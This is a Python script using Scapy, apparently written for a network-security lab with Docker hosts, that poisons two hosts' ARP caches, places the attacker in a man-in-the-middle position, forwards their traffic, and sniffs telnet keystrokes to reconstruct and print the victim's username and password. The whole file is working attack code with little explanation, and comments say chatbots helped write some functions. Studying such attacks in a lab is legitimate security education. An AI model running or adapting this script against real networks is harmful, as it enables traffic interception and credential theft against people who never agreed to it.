from scapy.all import *
import socket
import time

hostA_IP = '10.9.0.5'
hostB_IP = '10.9.0.6'
attacker_IP = '10.9.0.1'
random_IP = '10.9.0.7'
hostA_MAC = '02:42:0a:09:00:05'
hostB_MAC = '02:42:0a:09:00:06'
attacker_MAC = '02:42:14:a1:aa:a6'
interface = 'br-8fd4a2a351fb'

username = []
return_cnt = 0
password = []
credentials_captured = False
last_client_seq = 0 

def spoof(spoof_ip, target_ip):
    spoofed_pckt = Ether()/IP(src=spoof_ip, dst=target_ip)/ICMP()
    sendp(spoofed_pckt, iface= interface)
    
def poison_arp(spoof_ip, spoof_mac, target_ip, target_mac):
    arp_reply = Ether()/ARP(op=2, psrc=spoof_ip, pdst=target_ip, hwdst=target_mac, hwsrc=spoof_mac)
    sendp(arp_reply, iface=interface)
    print(f'ARP reply sent - poisoning complete: {arp_reply.summary()}')

def mitm():
    spoof(hostA_IP, hostB_IP)
    time.sleep(1)
    poison_arp(hostA_IP, attacker_MAC, hostB_IP, hostB_MAC)

    spoof(hostB_IP, hostA_IP)
    time.sleep(1)
    poison_arp(hostB_IP, attacker_MAC, hostA_IP, hostA_MAC)
    

def is_telnet_traffic(pckt): #GPT Generated Helper Function
    return pckt.haslayer(Raw) and pckt.haslayer(IP) and (pckt[IP].dst == hostB_IP or pckt[IP].src == hostB_IP)

def is_client_keystroke(pckt):
    return pckt.haslayer(Raw) and pckt.haslayer(IP) and pckt[IP].src == hostA_IP and pckt[IP].dst == hostB_IP

def forward_packet(pckt):
    if not pckt.haslayer(IP) or not pckt.haslayer(Ether):
        return
    newp = pckt.copy()
    if newp[IP].dst == hostA_IP:
        newp[Ether].dst = hostA_MAC
    elif newp[IP].dst == hostB_IP:
        newp[Ether].dst = hostB_MAC
    newp[Ether].src = attacker_MAC
    sendp(newp, iface=interface, verbose=False)

def _is_newline_byte(b): #ChatGPT generated helper function
    return b == 10 or b == 13 

def print_user_pass():
    u = "".join(username)
    p = "".join(password)
    print(f'Username: {u}')
    print(f'Password: {p}')
last_client_seq = 0



def print_pckt(pckt): #LLM (Claude Code) Aided Debug in Function

    global username, password, return_cnt, credentials_captured, last_client_seq


    if not is_client_keystroke(pckt) or credentials_captured:
        return
    if pckt.haslayer(TCP) and pckt[TCP].seq == last_client_seq:
        return

    if pckt.haslayer(TCP):
        last_client_seq = pckt[TCP].seq

    if pckt.haslayer(Raw):
        byte_data = pckt[Raw].load
        if byte_data in [b'\r\x00', b'\r', b'\n', b'\r\n']:
            return_cnt += 1
        elif not byte_data.startswith(b'\xff'):
            try:
                text = byte_data.decode('utf-8', errors='ignore')
                if text.strip():
                    if return_cnt == 0:
                        username.append(text)
                    else:
                        password.append(text)
            except:
                print("error--could not decode byte data")
                pass
        if return_cnt >= 2 and not credentials_captured:
            print_user_pass()
            credentials_captured = True


if __name__ == "__main__":
    print("Step 1: Creating initial ARP entry...")
    spoof(random_IP, hostA_IP)
    time.sleep(1)
    
    print("Step 2: Poisoning Host A's ARP table...")
    poison_arp(random_IP, attacker_MAC, hostA_IP, hostA_MAC)
    time.sleep(1)
    input("Paused after poisoning Host A. Run `docker exec -it hostA-10.9.0.5 arp -n` in another terminal to verify the entry. Press ENTER here to continue...")


    print("Step 3: Performing MiTM attack...")
    mitm()
    
    print("Step 4: Sniffing telnet traffic...")
    sniff(iface=interface, lfilter=is_telnet_traffic, prn=print_pckt)
